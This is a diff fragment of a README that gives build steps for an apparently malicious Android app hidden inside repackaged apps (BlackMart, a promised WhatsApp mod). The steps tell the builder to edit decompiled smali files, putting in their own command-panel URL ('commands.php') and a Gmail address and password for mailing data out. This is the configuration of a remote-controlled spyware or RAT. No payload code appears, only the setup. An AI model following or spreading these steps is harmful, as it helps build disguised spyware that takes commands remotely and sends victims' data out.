@@ -53,7 +53,7 @@ OR
 ---
 ### Building Apk with ApkEasyTool:
 
-1. Unzip BlackMart(apktool).zip and  Navigate to ***\BlackMart\smali_classes2\com\velociraptor\raptor*** 
+1. Wait For OneDay I will upload Decompiled WhatsappMod Apk and I will Explain to Use it 
 2. Open `InternalService.smali` 
 3. Replace this with your Panel Url ***const-string v0, "https://your-webpanel-url/public/commands.php"***
 4. Now open `MailConfig.smali` and enter your gmail address and password
